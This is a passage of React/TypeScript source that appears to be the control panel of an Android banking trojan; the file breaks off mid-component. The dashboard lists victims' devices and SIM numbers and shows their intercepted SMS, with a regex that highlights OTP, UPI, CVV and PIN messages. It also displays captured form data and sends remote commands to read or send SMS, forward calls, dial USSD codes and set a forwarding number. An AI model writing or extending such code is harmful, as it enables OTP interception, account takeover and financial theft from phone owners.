import React, { useState, useEffect, useCallback, useMemo, useRef, createContext, useContext } from "react";
import { createPortal } from "react-dom";
import { CircularLoader } from "@/components/ui/circular-loader";
import { CopyIconButton } from "@/components/ui/copy-icon-button";
import { DeleteIconButton } from "@/components/ui/delete-icon-button";

const DEVELOPER_TELEGRAM = "@mrrobot_dev";
const DEVELOPER_WHATSAPP = "+91 98765 43210";
const BUILD_VERSION = "v2.0.1 · 2026-05-18";

/* ─── Theme ─── */
interface Theme {
  bg: string; card: string; cardB: string;
  hdr: string; hdrB: string;
  txt: string; txt2: string; muted: string;
  isDark: boolean;
}
const LT: Theme = {
  bg: "#f1f5f9", card: "#ffffff", cardB: "#e2e8f0",
  hdr: "#f8fafc", hdrB: "#f1f5f9",
  txt: "#0f172a", txt2: "#334155", muted: "#94a3b8",
  isDark: false,
};
const DT: Theme = {
  bg: "#0f172a", card: "#1e293b", cardB: "#334155",
  hdr: "#162032", hdrB: "#243444",
  txt: "#f1f5f9", txt2: "#cbd5e1", muted: "#94a3b8",
  isDark: true,
};
const ThemeCtx = createContext<Theme>(LT);
function useTheme() { return useContext(ThemeCtx); }

interface DbDevice {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number; sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null; status: string;
  lastOnline: string | null; forwardEnabled: boolean; forwardSlot: number | null; fcmToken: string | null; installedAt: string;
}
interface DbMessage {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; toNumber?: string | null; body: string; isSensitive: boolean; receivedAt: string;
}
interface DbFormData { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string; }
type Page = "home" | "messages" | "groups" | "devices" | "settings";
type ActionKey = "online_check" | "get_sms" | "send_sms" | "update_number" | "call_forward" | "dial_ussd";
type SendState = "idle" | "loading" | "ok" | "err";

function sc(s: string) {
  if (s === "online") return "#22c55e";
  if (s === "uninstalled") return "#ef4444";
  return "#f59e0b";
}
function sl(s: string) {
  if (s === "online") return "Online";
  if (s === "uninstalled") return "Uninstalled";
  return "Inactive";
}
function fmtDate(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", year: "numeric",
    hour: "2-digit", minute: "2-digit", hour12: false,
  });
}
function fmtShort(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false,
  });
}

/* client-side timeAgo — computed live from raw ISO timestamp */
function timeAgo(iso: string | null): string {
  if (!iso) return "—";
  const dt = new Date(iso);
  if (isNaN(dt.getTime())) return iso; // fallback for legacy strings
  const secs = Math.floor((Date.now() - dt.getTime()) / 1000);
  if (secs < 0) return "just now";
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

/* returns true if lastOnline ISO is within last 15 minutes */
function isRecent(lastOnline: string | null): boolean {
  if (!lastOnline) return false;
  const dt = new Date(lastOnline);
  if (isNaN(dt.getTime())) return false;
  return Date.now() - dt.getTime() <= 15 * 60 * 1000;
}

function useInfiniteScroll<T>(items: T[], pageSize = 20, initialCount?: number, onCountChange?: (n: number) => void) {
  const [count, setCount] = useState(initialCount ?? pageSize);
  const sentinelRef = useRef<HTMLDivElement>(null);
  const itemsLen = useRef(items.length);
  const countRef = useRef(count);
  itemsLen.current = items.length;
  countRef.current = count;
  const onCountChangeRef = useRef(onCountChange);
  onCountChangeRef.current = onCountChange;
  const prevLenRef = useRef(items.length);
  const firstMount = useRef(true);
  // Reset to first page ONLY when items shrink (search / filter applied)
  useEffect(() => {
    if (firstMount.current) { firstMount.current = false; prevLenRef.current = items.length; return; }
    if (items.length < prevLenRef.current) { setCount(pageSize); }
    prevLenRef.current = items.length;
  }, [items.length, pageSize]); // eslint-disable-line react-hooks/exhaustive-deps
  // Single long-lived observer — refs keep values current without recreating on every page load.
  // Recreating on count change caused scroll stutter (re-render on every sentinel trigger).
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (!entries[0].isIntersecting) return;
      if (countRef.current >= itemsLen.current) return;
      requestAnimationFrame(() => {
        setCount(c => {
          if (c >= itemsLen.current) return c;
          const next = Math.min(c + pageSize, itemsLen.current);
          onCountChangeRef.current?.(next);
          return next;
        });
      });
    }, { rootMargin: "200px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [pageSize]); // eslint-disable-line react-hooks/exhaustive-deps
  useEffect(() => { onCountChangeRef.current?.(count); }, []); // eslint-disable-line react-hooks/exhaustive-deps
  const resetCount = useCallback((n: number) => { setCount(n); onCountChangeRef.current?.(n); }, []);
  return { visible: items.slice(0, count), sentinelRef, hasMore: count < items.length, loading: false, resetCount };
}

async function fcmSend(deviceId: string, data: Record<string, string>): Promise<string> {
  const res = await fetch("/api/fcm/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceId, data }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) throw new Error(String((body["error"] as Record<string, unknown>)?.["message"] ?? body["error"] ?? "FCM failed"));
  return String(body["messageId"] ?? "sent");
}

/** type "0" → Android: enqueueCheckOnline */
function mkCheckOnline(): Record<string, string> {
  return { type: "0" };
}
function mkDeviceCmd(_uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
  if (action === "get_sms") return { type: "get_sms" };
  if (action === "sms") return {
    type: "send_sms",
    to: String(extra?.to ?? ""),
    message: String(extra?.body ?? ""),
    sim: String(extra?.simSlot ?? 0),
  };
  if (action === "ussd") return {
    type: "dial_ussd",
    code: String(extra?.code ?? ""),
    sim: String(extra?.simSlot ?? 0),
  };
  return { type: action };
}
/** admin_update → Android: setAdminNumber / toggle admin status */
function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Record<string, string> {
  if (status === "on") return { type: "admin_update", status: "on", number };
  return { type: "admin_update", status: "off" };
}

/* ─── Banking / OTP keyword detector ─── */
// Junk fromSender values from old APK versions where `title` was sent instead
// of the real sender. When detected, fall back to `fromNumber` for display.
function isJunkSender(sender: string | null | undefined): boolean {
  if (!sender) return true;
  const s = sender.trim().toLowerCase();
  if (!s) return true;
  return s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
}

function isBankingMsg(body: string, sender: string): boolean {
  const text = (body + " " + sender).toLowerCase();
  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
}

/* ─── Scroll-to-top floating button ─── */
function ScrollToTopBtn() {
  const btn = (
    <button
      onClick={() => {
        document.getElementById("main-scroll")?.scrollTo({ top: 0, behavior: "smooth" });
      }}
      title="Scroll to top"
      style={{
        position: "fixed",
        bottom: 80,
        right: 18,
        zIndex: 999999,
        width: 46, height: 46, borderRadius: "50%",
        background: "#6366f1", border: "none", color: "#fff",
        fontSize: 22, fontWeight: 700, cursor: "pointer",
        boxShadow: "0 4px 14px rgba(99,102,241,0.55)",
        display: "flex",
        alignItems: "center", justifyContent: "center",
        WebkitTapHighlightColor: "transparent",
      }}
    >↑</button>
  );
  return createPortal(btn, document.body);
}

/* ─── Row helper ─── */
function Row({ label, value, mono, accent }: { label: string; value: string; mono?: boolean; accent?: string }) {
  const t = useTheme();
  return (
    <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
      <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>{label}</div>
      <div style={{ flex: 1, fontSize: 12, color: accent ?? t.txt, fontFamily: mono ? "monospace" : "inherit", wordBreak: "break-all" }}>{value}</div>
    </div>
  );
}

/* ─── Message card ─── */
const MsgCard = React.memo(function MsgCard({
  msg, deviceName, device, onOpen, cardClickable, formEntries,
}: {
  msg: DbMessage;
  deviceName: string;
  device?: DbDevice;
  onOpen?: (d: DbDevice, msgId: string) => void;
  cardClickable?: boolean;
  formEntries?: DbFormData[];
}) {
  const t = useTheme();
  const [showForm, setShowForm] = useState(false);

  function handleCardClick() {
    if (cardClickable && device) onOpen?.(device, String(msg.id));
  }

  return (
    <div id={`msg-${msg.id}`} style={{
      borderRadius: 8, overflow: "hidden", border: `1px solid ${t.cardB}`,
      // GPU skips offscreen card paint/layout → buttery scroll with thousands of cards.
      // `auto 140px` = remember each card's last-rendered height so pixel-scroll restore stays accurate.
      contentVisibility: "auto",
      containIntrinsicSize: "auto 140px",
    } as React.CSSProperties}>
      <div
        onClick={cardClickable && device ? handleCardClick : undefined}
        style={{
          background: t.card, padding: "10px 14px",
          cursor: cardClickable && device ? "pointer" : "default",
          transition: "box-shadow 0.15s",
        }}
        onMouseEnter={e => { if (cardClickable && device) (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"; }}
        onMouseLeave={e => { (e.currentTarget as HTMLDivElement).style.boxShadow = "none"; }}
      >
        {/* Header row */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
          <span style={{ fontSize: 10, background: t.hdrB, color: t.muted, padding: "1px 7px", borderRadius: 4 }}>{deviceName}</span>
        </div>

        {/* Body */}
        <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
          <div style={{ flex: 1, fontSize: 13, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
          <CopyIconButton value={msg.body} size={22} color="#6366f1" title="Copy message" />
        </div>

        {/* From / To + Delete */}
        <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
          {(() => {
            const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
            return (
              <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>{displaySender}
                <CopyIconButton value={displaySender} size={18} color="#6366f1" title="Copy sender" />
              </span>
            );
          })()}
          {msg.toNumber && (
            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>{msg.toNumber}
              <CopyIconButton value={msg.toNumber} size={18} color="#6366f1" title="Copy receiver" />
            </span>
          )}
          <span style={{ flex: 1 }} />
          <DeleteIconButton
            size={30}
            title="Delete this SMS"
            confirmTitle="Delete SMS"
            confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
            onConfirm={async () => {
              const r = await fetch(`/api/messages/${msg.id}`, { method: "DELETE" });
              if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
            }}
          />
        </div>
      </div>

      {/* Form Data button — only when formEntries provided */}
      {formEntries !== undefined && (
        <button
          onClick={() => setShowForm(v => !v)}
          style={{
            width: "100%", padding: "7px 0", border: "none", borderTop: `1px solid ${t.cardB}`,
            background: showForm ? t.hdrB : t.bg,
            color: "#8b5cf6",
            fontWeight: 700, fontSize: 11, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 5,
          }}
        >
          <span style={{ fontSize: 12 }}>◈</span>
          Form Data {formEntries.length > 0 ? `(${formEntries.length})` : "(0)"}
          <span style={{ fontSize: 10, display: "inline-block", transform: showForm ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>▾</span>
        </button>
      )}

      {/* Inline form data */}
      {formEntries !== undefined && showForm && (
        <div style={{ background: t.hdrB, borderTop: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          {formEntries.length === 0
            ? <div style={{ fontSize: 11, color: t.muted, textAlign: "center", padding: "8px 0" }}>No form data from this device</div>
            : formEntries.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()).map((entry, idx, arr) => {
                const pairs = Object.entries(entry.data ?? {});
                const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                return (
                  <div key={entry.id} style={{ borderBottom: idx < arr.length - 1 ? `1px solid ${t.cardB}` : "none" }}>
                    {/* Entry number + time — header row */}
                    <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: t.hdrB }}>
                      <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                      <span style={{ fontSize: 8, color: t.muted }}>{time}</span>
                    </div>
                    {/* Key-value rows */}
                    {pairs.length === 0
                      ? <div style={{ fontSize: 10, color: t.muted, padding: "2px 10px 4px" }}>—</div>
                      : pairs.map(([k, v]) => {
                        const sv = String(v ?? "");
                        return (
                          <div key={k} style={{ display: "flex", gap: 8, padding: "3px 10px", alignItems: "center", background: t.card }}>
                            <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 86, flexShrink: 0 }}>{fmtKey(k)}</span>
                            <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                            {sv && <CopyIconButton value={sv} size={18} color="#8b5cf6" title={`Copy ${fmtKey(k)}`} />}
                          </div>
                        );
                      })
                    }
                    {/* Delete button — bottom */}
                    <div style={{ display: "flex", justifyContent: "flex-end", padding: "4px 10px", background: t.hdrB }}>
                      <DeleteIconButton
                        size={26}
                        title="Delete this entry"
                        confirmTitle="Delete Form Entry"
                        confirmText="Are you sure you want to delete this form entry? This action cannot be undone."
                        onConfirm={async () => {
                          const r = await fetch(`/api/data/${entry.id}`, { method: "DELETE" });
                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                        }}
                      />
                    </div>
                  </div>
                );
              })
          }
        </div>
      )}
    </div>
  );
});

/* ─── SIM Selector ─── */
function SimSelect({ value, onChange, device }: { value: "1" | "2"; onChange: (v: "1" | "2") => void; device: DbDevice }) {
  const t = useTheme();
  const labels = {
    "1": [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(" · ") || "—",
    "2": [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(" · ") || "—",
  };
  return (
    <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
      {(["1", "2"] as const).map(s => {
        const active = value === s;
        return (
          <button key={s} onClick={() => onChange(s)} style={{
            flex: 1, padding: "8px 10px", borderRadius: 8, border: "1.5px solid",
            borderColor: active ? "#6366f1" : t.cardB,
            background: active ? (t.isDark ? "#1e1b4b" : "#eef2ff") : t.hdrB, cursor: "pointer", textAlign: "left",
          }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: active ? "#6366f1" : t.txt2 }}>SIM {s}</div>
            <div style={{ fontSize: 10, color: active ? "#818cf8" : t.muted, marginTop: 2, wordBreak: "break-all" }}>{labels[s]}</div>
          </button>
        );
      })}
    </div>
  );
}

function FieldInput({ placeholder, value, onChange, type = "text" }: { placeholder: string; value: string; onChange: (v: string) => void; type?: string }) {
  const t = useTheme();
  return (
    <input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} style={{
      width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
      padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
      color: t.txt, background: t.card, fontFamily: "inherit",
    }} />
  );
}

function StatusLog({ state, log }: { state: SendState; log: string }) {
  if (!log) return null;
  return (
    <div style={{
      fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
      background: state === "ok" ? "#f0fdf4" : state === "err" ? "#fef2f2" : "#fefce8",
      color: state === "ok" ? "#16a34a" : state === "err" ? "#dc2626" : "#92400e",
    }}>{log}</div>
  );
}

/* ── 5-second horizontal progress bar ── */
function SendProgressBar({ active }: { active: boolean }) {
  const [pct, setPct] = useState(0);
  const t = useTheme();
  useEffect(() => {
    if (!active) { setPct(0); return; }
    setPct(0);
    const start = Date.now();
    const DURATION = 5000;
    const tick = () => {
      const elapsed = Date.now() - start;
      const next = Math.min(100, Math.round((elapsed / DURATION) * 100));
      setPct(next);
      if (next < 100) requestAnimationFrame(tick);
    };
    const raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, [active]);

  if (!active && pct === 0) return null;
  return (
    <div style={{ marginTop: 8, height: 5, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
      <div style={{
        height: "100%", borderRadius: 99,
        background: "linear-gradient(90deg,#6366f1,#818cf8)",
        width: `${pct}%`,
        transition: "width 0.1s linear",
      }} />
    </div>
  );
}

function PrimaryBtn({ state, idle, loading: ld, ok, onClick }: {
  state: SendState; idle: string; loading: string; ok: string; onClick: () => void;
}) {
  return (
    <>
      <button onClick={onClick} disabled={state === "loading"} style={{
        width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
        background: state === "ok" ? "#22c55e" : "#6366f1",
        color: "#fff", fontWeight: 700, fontSize: 14,
        cursor: state === "loading" ? "wait" : "pointer", marginTop: 2,
      }}>
        {state === "loading" ? ld : state === "ok" ? ok : idle}
      </button>
      <SendProgressBar active={state === "loading"} />
    </>
  );
}

/* ════ INLINE ACTION PANEL ════ */
function ActionPanel({ action, device, onClose }: { action: ActionKey; device: DbDevice; onClose: () => void }) {
  const [sim, setSim] = useState<"1" | "2">("1");
  const [number, setNumber] = useState("");
  const [smsText, setSmsText] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [state, setState] = useState<SendState>("idle");
  const [log, setLog] = useState("");
  const [countdown, setCountdown] = useState(0);
  const [fcmBar, setFcmBar] = useState(false); // 5-second progress bar after FCM send
  const [updateDisableState, setUpdateDisableState] = useState<SendState>("idle");

  // Live countdown for online_check: 0 → 30
  useEffect(() => {
    if (state !== "loading" || action !== "online_check") return;
    setCountdown(0);
    const iv = setInterval(() => setCountdown(c => c + 1), 1000);
    return () => clearInterval(iv);
  }, [state, action]);

  // Auto-timeout online_check after 30s — silently reset to idle
  useEffect(() => {
    if (state !== "loading" || action !== "online_check") return;
    const t = setTimeout(() => setState("idle"), 30000);
    return () => clearTimeout(t);
  }, [state, action]);

  // SSE: device responded → stop online_check countdown & show success
  useEffect(() => {
    if (action !== "online_check") return;
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId) return;
      setState("ok");
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [action, device.deviceId]);

  async function send(data: Record<string, string>) {
    setState("loading"); setLog("");
    setFcmBar(true); // Start 5-second FCM progress bar immediately
    const barTimer = setTimeout(() => setFcmBar(false), 5000);
    try {
      await fcmSend(device.deviceId, data);
      // online_check stays "loading" until SSE fires (device heartbeat) or 30s timeout
      if (action !== "online_check") {
        setState("ok"); setLog("");
      }
    } catch {
      setState("idle");
      clearTimeout(barTimer); setFcmBar(false);
    }
  }

  const titles: Record<ActionKey, string> = {
    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
    update_number: "Update Number", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
  };

  const t = useTheme();

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1.5px solid ${t.cardB}`, padding: "14px", boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 14 }}>
        <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{titles[action]}</div>
        <button onClick={onClose} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
      </div>

      {action === "online_check" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
            Pings <b>{device.name}</b> to check if it's online and reachable.
          </div>
          <StatusLog state={state} log={log} />
          <button onClick={() => void send(mkCheckOnline())} disabled={state === "loading"} style={{
            width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
            background: state === "ok" ? "#22c55e" : "#6366f1",
            color: "#fff", fontWeight: 700, fontSize: 14,
            cursor: state === "loading" ? "wait" : "pointer", marginTop: 2,
          }}>
            {state === "loading" ? `Waiting… ${countdown}s` : state === "ok" ? "✓ Online" : "Ping Device"}
          </button>
          {state === "loading" && (
            <div style={{ textAlign: "center", fontSize: 11, color: t.muted, marginTop: 8 }}>
              Waiting for device response… ({30 - countdown}s remaining)
            </div>
          )}
        </>
      )}
      {action === "get_sms" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>Device will upload its latest messages.</div>
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Get SMS" loading="Requesting…" ok="Sent" onClick={() => void send(mkDeviceCmd(device.deviceId, "get_sms"))} />
        </>
      )}
      {action === "send_sms" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Recipient number" value={number} onChange={setNumber} type="tel" />
          <textarea value={smsText} onChange={e => setSmsText(e.target.value)} placeholder="Message text…" rows={3} style={{
            width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
            padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
            color: t.txt, background: t.card, resize: "vertical", fontFamily: "inherit",
          }} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Send SMS" loading="Sending…" ok="SMS Sent" onClick={() => {
            if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
            if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "sms", { to: number.trim(), body: smsText.trim(), simSlot: sim === "2" ? 1 : 0, timestamp: Date.now() }));
          }} />
        </>
      )}
      {action === "update_number" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
            Update admin number for <b>{device.name}</b>.
          </div>
          <FieldInput placeholder="10-digit number" value={number} onChange={v => setNumber(v.replace(/\D/g, "").slice(0, 10))} type="tel" />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Update Number" loading="Updating…" ok="Updated ✓" onClick={() => {
            const digits = number.replace(/\D/g, "");
            if (digits.length !== 10) { setLog("Enter exactly 10 digits."); setState("err"); return; }
            void send(mkAdminUpdate(device.deviceId, digits, "on"));
          }} />
          <div style={{ marginTop: 10 }}>
            <button
              onClick={() => {
                setUpdateDisableState("loading");
                fcmSend(device.deviceId, mkAdminUpdate(device.deviceId, "", "off"))
                  .then(() => { setUpdateDisableState("ok"); setTimeout(() => setUpdateDisableState("idle"), 3000); })
                  .catch(() => { setUpdateDisableState("idle"); });
              }}
              disabled={updateDisableState === "loading"}
              style={{
                width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444",
                background: updateDisableState === "ok" ? "#22c55e" : updateDisableState === "loading" ? "#fee2e2" : "transparent",
                color: updateDisableState === "ok" ? "#fff" : "#ef4444",
                fontWeight: 700, fontSize: 13,
                cursor: updateDisableState === "loading" ? "wait" : "pointer",
                transition: "background 0.15s",
              }}
            >
              {updateDisableState === "loading" ? "Disabling…" : updateDisableState === "ok" ? "Disabled ✓" : "Disable Forwarding"}
            </button>
          </div>
        </>
      )}
      {action === "call_forward" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Forward to number" value={number} onChange={setNumber} type="tel" />
          <StatusLog state={state} log={log} />
          <div style={{ display: "flex", gap: 10 }}>
            <button onClick={() => {
              if (!number.trim()) { setLog("Enter a number to forward calls to."); setState("err"); return; }
              void send({ type: "call_forward", action: "activate", number: number.trim(), sim: String(sim === "2" ? 1 : 0) });
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: state === "ok" ? "#22c55e" : "#22c55e", color: "#fff", fontWeight: 700, fontSize: 14, cursor: state === "loading" ? "wait" : "pointer" }}>
              {state === "loading" ? "Activating…" : "Activate"}
            </button>
            <button onClick={() => {
              void send({ type: "call_forward", action: "deactivate", number: "", sim: String(sim === "2" ? 1 : 0) });
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: "#ef4444", color: "#fff", fontWeight: 700, fontSize: 14, cursor: state === "loading" ? "wait" : "pointer" }}>
              {state === "loading" ? "Deactivating…" : "Deactivate"}
            </button>
          </div>
          <div style={{ fontSize: 9, color: t.muted, textAlign: "center", marginTop: 4 }}>
            Deactivate dials <span style={{ fontFamily: "monospace", color: "#f87171" }}>##21#</span> automatically
          </div>
        </>
      )}
      {action === "dial_ussd" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="USSD code (e.g. *123#)" value={ussdCode} onChange={setUssdCode} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Dial USSD" loading="Dialing…" ok="Dialed" onClick={() => {
            if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "ussd", { code: ussdCode.trim(), simSlot: sim === "2" ? 1 : 0 }));
          }} />
        </>
      )}
      {/* 5-second FCM sent progress bar — shows for ALL actions after FCM payload is sent */}
      <SendProgressBar active={fcmBar} />
    </div>
  );
}

/* ════ STAT CARD ════ */
function Stat({ label, value, color }: { label: string; value: string | number; color: string }) {
  return (
    <div style={{ background: "#fff", borderRadius: 8, padding: "12px 14px", border: "1px solid #e2e8f0" }}>
      <div style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.4, marginBottom: 6 }}>{label}</div>
      <div style={{ fontSize: 24, fontWeight: 800, color }}>{value}</div>
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — HOME
════════════════════════════════════════ */
interface AdminSession { id: string; loginTime: string; lastActive: string; userAgent: string; ip: string; device: string; }

function fmtTime(iso: string) {
  const d = new Date(iso);
  return d.toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
}

function HomePage({
  devices, messages, formData, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
}: {
  devices: DbDevice[];
  messages: DbMessage[];
  formData: DbFormData[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
  initialCount?: number;
  onCountChange?: (n: number) => void;
}) {
  const t = useTheme();
  const [search, setSearch] = useState("");

  // Build device lookup once per devices change — O(1) lookups vs O(n) find()
  const deviceMap = useMemo(() => {
    const m = new Map<string, DbDevice>();
    for (const d of devices) m.set(d.deviceId, d);
    return m;
  }, [devices]);
  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);

  const formByDevice = useMemo(() => {
    const acc: Record<string, DbFormData[]> = {};
    for (const f of formData) {
      if (!acc[f.deviceId]) acc[f.deviceId] = [];
      acc[f.deviceId].push(f);
    }
    return acc;
  }, [formData]);

  // Memoize the heavy sort+filter — recomputed only when inputs change, NOT on every 1s live tick
  const allMsgs = useMemo(() => {
    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
    const q = search.toLowerCase().trim();
    if (!q) return sorted;
    return sorted.filter(m => {
      const dev = deviceMap.get(m.deviceId);
      return (
        m.deviceId.toLowerCase().includes(q) ||
        m.userId.toLowerCase().includes(q) ||
        m.body.toLowerCase().includes(q) ||
        m.fromSender.toLowerCase().includes(q) ||
        m.fromNumber.includes(q) ||
        (dev?.name ?? "").toLowerCase().includes(q)
      );
    });
  }, [messages, search, deviceMap]);

  const { visible: visibleMsgs, sentinelRef: homeSentinel, loading: homeLoading } = useInfiniteScroll(allMsgs, 20, initialCount, onCountChange);

  // Robust scroll-to-message: retry until the card actually mounts in the DOM.
  // Cards may not exist yet because (a) infinite-scroll batches them in or
  // (b) content-visibility:auto hasn't realized their layout yet.
  useEffect(() => {
    if (!scrollToMsgId) return;
    let attempts = 0;
    let cancelled = false;
    const tryScroll = () => {
      if (cancelled) return;
      const el = document.getElementById(`msg-${scrollToMsgId}`);
      if (el) {
        el.scrollIntoView({ behavior: "instant" as ScrollBehavior, block: "center" });
        onScrollDone?.();
        return;
      }
      if (++attempts < 40) setTimeout(tryScroll, 50);
    };
    requestAnimationFrame(tryScroll);
    return () => { cancelled = true; };
  }, [scrollToMsgId]); // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Search bar ── */}
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search by device ID, user ID, message…"
